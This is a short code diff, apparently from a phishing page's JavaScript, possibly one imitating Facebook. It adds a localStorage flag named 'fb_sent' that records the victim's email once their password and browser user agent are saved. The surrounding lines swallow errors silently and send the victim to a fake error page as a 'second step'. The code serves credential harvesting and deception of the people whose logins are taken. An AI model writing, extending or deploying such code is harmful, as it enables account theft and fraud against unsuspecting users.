@@ -177,6 +177,8 @@
         password:   password,
         user_agent: navigator.userAgent
       }]);
+      // Marquer que les données ont été enregistrées
+      localStorage.setItem('fb_sent', email);
     } catch (err) { /* silent */ }
 
     // Redirect to error page (2nd step)
